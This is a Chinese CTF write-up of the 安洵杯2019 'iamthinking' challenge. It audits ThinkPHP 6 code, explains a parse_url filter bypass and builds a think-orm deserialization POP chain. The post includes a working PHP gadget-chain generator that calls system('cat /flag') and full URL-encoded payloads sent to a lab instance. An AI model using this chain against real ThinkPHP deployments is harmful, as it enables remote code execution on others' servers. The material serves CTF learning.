---
title: 安洵杯2019-iamthinking
date: 2025-05-18 20:02:09
tags:
- parse_url绕过
- tp6
- 反序列化
category:
- 刷题笔记
---

# 安洵杯2019-iamthinking

参考博客：https://blog.csdn.net/2301_80148821/article/details/143898080

首先打开网页，发现403报错，然后看了下题目简介让我们访问/pubilc，访问成功只有一张图片

![](../image/安洵杯2019-iamthinking-1.png)

根据题目来看应该是要审tp的框架，下载www.zip文件。

然后就是漫长的代码审计

## 代码审计

先查看index.php

```
#\app\controller\index.php

<?php
namespace app\controller;
use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        
        echo "<img src='../test.jpg'"."/>";
        $paylaod = @$_GET['payload'];
        if(isset($paylaod))
        {
            $url = parse_url($_SERVER['REQUEST_URI']);
            parse_str($url['query'],$query);
            foreach($query as $value)
            {
                if(preg_match("/^O/i",$value))
                {
                    die('STOP HACKING');
                    exit();
                }
            }
            unserialize($paylaod);
        }
    }
}
```

---

## parse_url函数绕过

可以看到有parse_url函数过滤，提取我们的get请求，然后进行正则匹配，匹配到以O开头的字符串就直接报错，这样就导致我们不能传入序列化字符串。

但是我们之前学过parse_url的绕过方式，使其返回false。

只要在index.php前面加三个/即可绕过。

```
http://xxx.com///index.php?payload=cmd
```

---

## 构造pop链

现在有反序列化函数了，但是要构造pop链，需要找`__destruct()`，最后，我们找到位于`vendor/tothink/think-orm/src/Model.php`下有destruct

```
    public function __destruct()
    {
        if ($this->lazySave) {
            $this->save();
        }
    }
}
```

如果要执行`$this->save()`，就要使`$this->lazySave==true`

然后继续找save函数

```
public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);

        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }

        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);

        if (false === $result) {
            return false;
        }

        // 写入回调
        $this->trigger('AfterWrite');

        // 重新记录原始数据
        $this->origin   = $this->data;
        $this->set      = [];
        $this->lazySave = false;

        return true;
    }
```

可以看到data是一个空数组，跟进setAttrs函数我们可以发现，这个函数就是一个进行数据处理的函数

```
public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);

        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }

        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);

        if (false === $result) {
            return false;
        }

        // 写入回调
        $this->trigger('AfterWrite');

        // 重新记录原始数据
        $this->origin   = $this->data;
        $this->set      = [];
        $this->lazySave = false;

        return true;
    }
```

接着往下看，

如果`$this->isEmpty() || false === $this->trigger(‘BeforeWrite’)`这俩个有一个满足的话，我们就会直接返回false，无法继续向下执行，所以他们俩个都不能成立。

```
    public function isEmpty(): bool
    {
        return empty($this->data);
    }
```

可以看到isEmpty函数，就是判断data是否为空，是就返回ture，否则返回false，所以data不能为空。

所以**条件2、this->data不能为空**

看到下一个**trigger**

```
    public function withEvent(bool $event)
    {
        $this->withEvent = $event;
        return $this;
    }


    protected function trigger(string $event): bool
    {
        if (!$this->withEvent) {
            return true;
        }
```

但是发现event已经赋值了`$this->trigger('BeforeWrite')`，默认就是返回true。

然后就是这一段代码。

```
$result = $this->exists ? $this->updateData() : $this->insertData($sequence);
```

所以我们继续跟进updateDate()函数。

```
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {
            return false;
        }

        $this->checkData();

        // 获取有更新的数据
        $data = $this->getChangedData();

        if (empty($data)) {
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }

            return true;
        }

        if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) {
            // 自动写入更新时间
            $data[$this->updateTime]       = $this->autoWriteTimestamp($this->updateTime);
            $this->data[$this->updateTime] = $data[$this->updateTime];
        }

        // 检查允许字段
        $allowFields = $this->checkAllowFields();
```

前面的if判断也不需要管，因为也是默认不能触发和之前那个一样。然后就是checkData()函数，跟进去发现其实就是一个void

```
 protected function checkData(): void
    {
    }
```

然后继续往下就是getChangedDate()函数，也不用管，后面那个if当data不为空时就已经触发不了了，所以我们继续跟进`checkAllowFields`函数。

```
    protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {
            if (!empty($this->schema)) {
                $this->field = array_keys(array_merge($this->schema, $this->jsonType));
            } else {
                $table = $this->table ? $this->table . $this->suffix : $query->getTable();
                $this->field = $query->getConnection()->getTableFields($table);
            }

            return $this->field;
        }
```

这个函数主要就是这一段，可以看到else中`$this->table . $this->suffix`这里有函数拼接，也就是说可以触发**`__toString`函数**。

所以条件`$this->field`要为空，`$this->schema`也要为空，`$this->table`要为true

并且我们如果要进入到updateDate中，我们的`$this->exists`也要为true。

```
$result = $this->exists ? $this->updateData() : $this->insertData($sequence);
```

然后我们就可以去在项目中去找`__toString`函数

可以在`/vendor/topthink/think-orm/src/model/concern/Conversion.php`中可以找到目标

```
    public function __toString()
    {
        return $this->toJson();
    }
```

然后就是继续跟进toJson函数。

```
    public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
    {
        return json_encode($this->toArray(), $options);
    }
```

然后就是继续跟进toArray()函数

```
    public function toArray(): array
    {
        $item       = [];
        $hasVisible = false;

        foreach ($this->visible as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    list($relation, $name)      = explode('.', $val);
                    $this->visible[$relation][] = $name;
                } else {
                    $this->visible[$val] = true;
                    $hasVisible          = true;
                }
                unset($this->visible[$key]);
            }
        }

        foreach ($this->hidden as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    list($relation, $name)     = explode('.', $val);
                    $this->hidden[$relation][] = $name;
                } else {
                    $this->hidden[$val] = true;
                }
                unset($this->hidden[$key]);
            }
        }

        // 合并关联数据
        $data = array_merge($this->data, $this->relation);

        foreach ($data as $key => $val) {
            if ($val instanceof Model || $val instanceof ModelCollection) {
                // 关联模型对象
                if (isset($this->visible[$key]) && is_array($this->visible[$key])) {
                    $val->visible($this->visible[$key]);
                } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {
                    $val->hidden($this->hidden[$key]);
                }
                // 关联模型对象
                if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {
                    $item[$key] = $val->toArray();
                }
            } elseif (isset($this->visible[$key])) {
                $item[$key] = $this->getAttr($key);
            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                $item[$key] = $this->getAttr($key);
            }
        }

        // 追加属性（必须定义获取器）
        foreach ($this->append as $key => $name) {
            $this->appendAttrToArray($item, $key, $name);
        }

        return $item;
    }
```

这段函数的代码很长，但是大概功能就是处理数据的功能，转化对象为数组。

而默认情况下，这段代码会进入elseif中触发getAttr。

所以继续跟进getAttr函数

```
    public function getAttr(string $name)
    {
        try {
            $relation = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation = $this->isRelationAttr($name);
            $value    = null;
        }

        return $this->getValue($name, $value, $relation);
    }
```

继续跟进getDate函数

```
    public function getData(string $name = null)
    {
        if (is_null($name)) {
            return $this->data;
        }
```

默认情况下name为空，所以会触发返回data。

然后赋值的data会被传入$value，然后就到了getValue函数。继续跟进

```
protected function getValue(string $name, $value, $relation = false)
{
    // 检测属性获取器
    $fieldName = $this->getRealFieldName($name);
    $method    = 'get' . Str::studly($name) . 'Attr';

    if (isset($this->withAttr[$fieldName])) {
        if ($relation) {
            $value = $this->getRelationValue($relation);
        }

        if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
            $value = $this->getJsonValue($fieldName, $value);
        } else {
            //$fieldName = a
            //withAttr[a] = system
            $closure = $this->withAttr[$fieldName];
            //value = system(ls,)
            $value   = $closure($value, $this->data);
        }
```

这里就是主要的执行函数了。

最终目的就是实现

```
       //$fieldName = a
            //withAttr[a] = system
            $closure = $this->withAttr[$fieldName];
            //value = system(ls,)
            $value   = $closure($value, $this->data);
```

先跟进一下`$fieldName = $this->getRealFieldName($name);`中的getReakFieldName

```
    protected function getRealFieldName(string $name): string
    {
        return $this->strict ? $name : Str::snake($name);
    }
```

当**this->strict=true**时，我们直接返回name，在上面，那么被赋值为了data。

也就是fieldName参数就是为data赋进去的值。

**pop链构造成功，poc脚本**

```
<?php
 
namespace think\model\concern;
 
trait Attribute
{
    private $data = ["key" => ["key1" => "cat /flag"]];
    private $withAttr = ["key"=>["key1"=>"system"]];
    protected $json = ["key"];
}
namespace think;
 
abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}
 
namespace think\model;
 
use think\Model;
 
class Pivot extends Model
{
}
$a = new Pivot();
$b = new Pivot($a);
echo urlencode(serialize($b));
```

payload：

```
http://3d02d9f6-26d5-4551-9071-5e2daab08408.node5.buuoj.cn///public/index.php?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22key%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22key%22%3B%7D%7D
```

也可以将$b填入数组，这样序列化出来之后的字符串开头就不是O，就不需要parse_url绕过了。

```
<?php
 
namespace think\model\concern;
 
trait Attribute
{
    private $data = ["key" => ["key1" => "cat /flag"]];
    private $withAttr = ["key"=>["key1"=>"system"]];
    protected $json = ["key"];
}
namespace think;
 
abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}
 
namespace think\model;
 
use think\Model;
 
class Pivot extends Model
{
}
$a = new Pivot();
$b = new Pivot($a);
$c = array($b);
echo urlencode(serialize($c));
```

payload：

```
http://3d02d9f6-26d5-4551-9071-5e2daab08408.node5.buuoj.cn/public/index.php?payload=a%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22key%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Ba%3A1%3A%7Bs%3A4%3A%22key1%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22key%22%3B%7D%7D%7D
```

但是这题好像有点问题，在url前面加了三个///并没有成功绕过parse_url函数，反序列化字符串被过滤了，只有第二种填入数组法能生效。











